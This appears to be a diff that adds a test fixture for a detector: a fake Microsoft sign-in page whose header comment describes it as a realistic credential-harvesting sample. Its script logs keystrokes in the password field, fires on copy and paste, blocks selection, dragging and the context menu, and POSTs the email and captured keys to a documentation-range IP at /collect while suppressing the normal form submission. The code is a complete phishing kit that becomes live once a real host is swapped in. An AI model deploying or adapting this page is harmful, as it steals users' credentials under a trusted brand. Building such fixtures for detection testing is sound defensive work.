@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<!--
+  Realistic credential-harvesting page with runtime behavioral signals (L6):
+  - keydown/keyup listeners on the password field (keylogger)
+  - copy/paste hooks (clipboard)
+  - drag / selection blocking (anti-inspection)
+  - credentials POSTed off-origin to a documentation-range IP (198.51.100.23,
+    RFC 5737 TEST-NET-2 — guaranteed non-routable, so the test makes no real
+    request to anyone; the network observer still records the request issue).
+-->
+<html>
+<head>
+<meta charset="utf-8">
+<title>Microsoft account | Sign in</title>
+<style>
+  html, body { margin: 0; padding: 0; background: #f3f2f1; font-family: "Segoe UI", Arial, sans-serif; }
+  .shell { max-width: 400px; margin: 8vh auto; background: #fff; padding: 36px;
+           box-shadow: 0 2px 6px rgba(0,0,0,.18); }
+  .brand { font-size: 22px; font-weight: 600; margin-bottom: 18px; }
+  .brand img { vertical-align: middle; margin-right: 8px; }
+  input[type=email], input[type=password] { width: 100%; padding: 9px 10px; margin: 8px 0;
+           border: 1px solid #8a8886; font-size: 14px; }
+  .btn { width: 100%; padding: 10px; background: #0f6cbd; color: #fff; border: 0;
+         font-size: 15px; cursor: pointer; margin-top: 10px; }
+  .hint { font-size: 12px; color: #616161; margin-top: 14px; }
+</style>
+</head>
+<body>
+<div class="shell">
+  <div class="brand"><img src="./logo.svg" width="24" height="24" alt="">Microsoft</div>
+  <h2 style="font-weight:600">Sign in</h2>
+  <form id="login" action="/oauth2/authorize" method="POST">
+    <input type="email" id="email" name="email" placeholder="Email, phone, or Skype" required>
+    <input type="password" id="pwd" name="passwd" placeholder="Password" required>
+    <button class="btn" type="submit">Sign in</button>
+  </form>
+  <div class="hint">No account? <a href="/signup">Create one!</a></div>
+</div>
+
+<script>
+// ── keylogger: capture every keystroke on the password field ──
+var _buf = "";
+var pwd = document.getElementById("pwd");
+pwd.addEventListener("keydown", function (e) { _buf += e.key; });
+pwd.addEventListener("keyup", function () { _ship(); });
+
+// ── clipboard hooks ──
+document.addEventListener("copy", function () { _ship(); });
+document.addEventListener("paste", function () { _ship(); });
+
+// ── anti-inspection: block drag / selection / context menu ──
+document.addEventListener("dragstart", function (e) { e.preventDefault(); });
+document.addEventListener("selectstart", function (e) { e.preventDefault(); });
+document.addEventListener("contextmenu", function (e) { e.preventDefault(); });
+
+// ── off-origin credential exfiltration ──
+function _ship() {
+  try {
+    fetch("http://198.51.100.23/collect", {
+      method: "POST", mode: "no-cors",
+      body: JSON.stringify({ u: document.getElementById("email").value, k: _buf })
+    });
+  } catch (e) {}
+}
+document.getElementById("login").addEventListener("submit", function (e) {
+  e.preventDefault(); _ship();
+});
+</script>
+</body>
+</html>
